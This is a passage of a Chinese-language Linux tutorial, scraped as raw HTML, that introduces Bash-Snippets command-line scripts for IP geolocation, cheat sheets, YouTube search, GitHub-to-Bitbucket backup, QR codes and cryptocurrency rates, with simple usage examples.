class=\"crayon-e\">Returns </span><span class=\"crayon-e\">LAN </span><span class=\"crayon-e\">IP</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Returns </span><span class=\"crayon-e\">Router </span><span class=\"crayon-v\">IP</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Returns </span><span class=\"crayon-e\">DNS </span><span class=\"crayon-v\">Nameserver</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Returns </span><span class=\"crayon-e\">MAC </span><span class=\"crayon-e\">address </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">interface</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Ex</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Returns </span><span class=\"crayon-e\">Current </span><span class=\"crayon-e\">IP </span><span class=\"crayon-e\">Geodata</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-11\"><span class=\"crayon-v\">Examples</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-12\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">geo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">geo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">wlrdgm </span><span class=\"crayon-e\">eth0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-14\"><span class=\"crayon-e\">Custom </span><span class=\"crayon-e\">Geo </span><span class=\"crayon-v\">Output</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-15\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">all</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">query</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">city</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">region</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">country</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">zip</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">isp</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-16\"><span class=\"crayon-v\">Example</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">geo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8.8.8.8</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">city</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">zip</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">isp</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-17\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">options</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Returns </span><span class=\"crayon-e\">Specific </span><span class=\"crayon-v\">Geodata</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-18\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">address</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">For</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">specific </span><span class=\"crayon-e\">ip </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">s</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-19\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Returns </span><span class=\"crayon-v\">Version</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dc4127492521-20\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Returns </span><span class=\"crayon-e\">Help </span><span class=\"crayon-v\">Screen</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83dc4127492521-21\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Updates </span><span class=\"crayon-v\">Bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Snippets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0146 seconds] -->\r\n<p></p>\n<h4 id=\"toc_11\">9、 Cheat – 显示 Linux 命令的备忘单</h4>\n<p>想参考 Linux 命令的备忘单吗？这是可能的。以下命令将显示 <code>curl</code> 命令的备忘单：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dc8659269359\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cheat curl</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dc8659269359-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dc8659269359-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cheat </span><span class=\"crayon-v\">curl</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>只需用你选择的命令替换 <code>curl</code> 即可显示其备忘单。这对于快速参考你要使用的任何命令非常有用。</p>\n<h4 id=\"toc_12\">10、 Youtube-Viewer – 观看 YouTube 视频</h4>\n<p>使用此脚本，你可以直接在终端上搜索或打开 YouTube 视频。（LCTT 译注：在媒体播放器中，而不是文本的终端中打开）</p>\n<p>让我们来看一些有关 <strong>Ed Sheeran</strong> 的视频。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dcc176440024\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ytview Ed Sheeran</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dcc176440024-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dcc176440024-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ytview </span><span class=\"crayon-e\">Ed </span><span class=\"crayon-v\">Sheeran</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>从列表中选择要播放的视频。所选内容将在你的默认媒体播放器中播放。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/69c016c8d2925ebc204de486d913a907.png\" alt=\"\"></p>\n<p>要查看艺术家的近期视频，你可以使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dcf192063122\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ytview -c [channel name]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dcf192063122-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dcf192063122-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ytview</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">channel </span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>要寻找视频，只需输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dd2193721358\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ytview -s [videoToSearch]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dd2193721358-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dd2193721358-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ytview</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">videoToSearch</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>或者：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dd5568900801\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ytview [videoToSearch]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dd5568900801-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dd5568900801-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ytview</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">videoToSearch</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h4 id=\"toc_13\">11、 cloudup – 备份 GitHub 仓库到 bitbucket</h4>\n<p>你在 GitHub 上托管过任何项目吗？如果托管过，那么你可以随时间 GitHub 仓库备份到 <strong>bitbucket</strong>，它是一种用于源代码和开发项目的基于 Web 的托管服务。</p>\n<p>你可以使用 <code>-a</code> 选项一次性备份指定用户的所有 GitHub 仓库，或者备份单个仓库。</p>\n<p>要备份 GitHub 仓库，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dd9277303076\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cloudup</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dd9277303076-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dd9277303076-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cloudup</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>系统将要求你输入 GitHub 用户名， 要备份的仓库名称以及 bitbucket 用户名和密码等。</p>\n<h4 id=\"toc_14\">12、 Qrify – 将字符串转换为二维码</h4>\n<p>这个脚本将任何给定的文本字符串转换为二维码。这对于发送链接或者保存一串命令到手机非常有用。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83ddc270070796\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ qrify convert this text into qr code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83ddc270070796-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83ddc270070796-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">qrify </span><span class=\"crayon-e\">convert </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">text </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">qr </span><span class=\"crayon-v\">code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>示例输出：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/8bc142cd7dab438ca883c144e137680f.png\" alt=\"\"></p>\n<p>很酷，不是吗？</p>\n<h4 id=\"toc_15\">13、 Cryptocurrency</h4>\n<p>它将显示十大加密货币实时汇率。</p>\n<p>输入以下命令，然后单击回车来运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83ddf233416509\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px 